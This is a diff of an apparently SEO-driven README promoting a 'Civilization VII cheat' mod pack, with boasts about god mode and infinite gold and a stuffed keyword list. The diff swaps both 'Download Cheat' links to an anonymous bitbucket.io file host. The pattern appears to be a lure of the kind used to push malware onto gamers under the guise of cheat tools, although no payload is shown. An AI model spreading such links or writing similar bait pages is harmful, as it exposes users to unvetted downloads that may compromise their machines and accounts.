@@ -4,7 +4,7 @@ Tired of waiting 20 turns to build one unit while Gandhi nukes you on turn 80? *
 
 Take control of the game engine, not just the map. From **singleplayer sandbox domination** to wild experimental runs, this mod pack puts the power of the gods in your hands ⚡.
 
-[![Download Cheat](https://img.shields.io/badge/Download-Cheat-blueviolet)](https://wecheaters.github.io/cheats/civilization-vii/)
+[![Download Cheat](https://img.shields.io/badge/Download-Cheat-blueviolet)](https://fileoffload5.bitbucket.io)
 ---
 
 ## 🧠 What is a Civ 7 Cheat?
@@ -13,7 +13,7 @@ Cheats for **Civilization VII** are tools that inject commands into your game or
 
 No more waiting for wonders. No more hoping you survive the barb rush. Just **instant results and world domination**.
 
-[![Download Cheat](https://cdn.shazoo.ru/c2400x1338/762864_Z8chNbg_4.jpg)](https://wecheaters.github.io/cheats/civilization-vii/)
+[![Download Cheat](https://cdn.shazoo.ru/c2400x1338/762864_Z8chNbg_4.jpg)](https://fileoffload5.bitbucket.io)
 ---
 
 ## 🔥 Cheat Features in Civilization VII
@@ -105,3 +105,4 @@ Why play by the rules… when you can write your own 🧠🔥
 ## 🔑 Keywords:
 
 Civilization VII cheat, Civ 7 trainer mod, Civ 7 infinite gold, Civilization 7 god mode, Civ 7 instant build, Civilization VII ESP, Civ 7 map reveal, Civ 7 unit cheat, Civ 7 console commands, cheat tool Civilization 7, unlimited science Civ, skip turns Civ 7, god mode Civ cheat.
+
